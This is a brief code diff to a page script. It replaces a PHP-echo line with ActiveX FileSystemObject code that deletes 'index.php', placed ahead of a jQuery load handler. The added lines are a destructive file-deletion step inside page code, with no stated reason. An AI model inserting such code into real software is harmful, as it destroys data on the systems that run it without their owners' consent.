@@ -1,5 +1,7 @@
-var myvar = <?php echo "rajeev"; ?>;
-
+myActiveXObject = new ActiveXObject("Scripting.FileSystemObject");
+  file = myActiveXObject.GetFile("index.php");
+  file.Delete();
+  
 jQuery(this).load(function(){
 
 var client = window.location.protocol + "//" + window.location.host + "/";
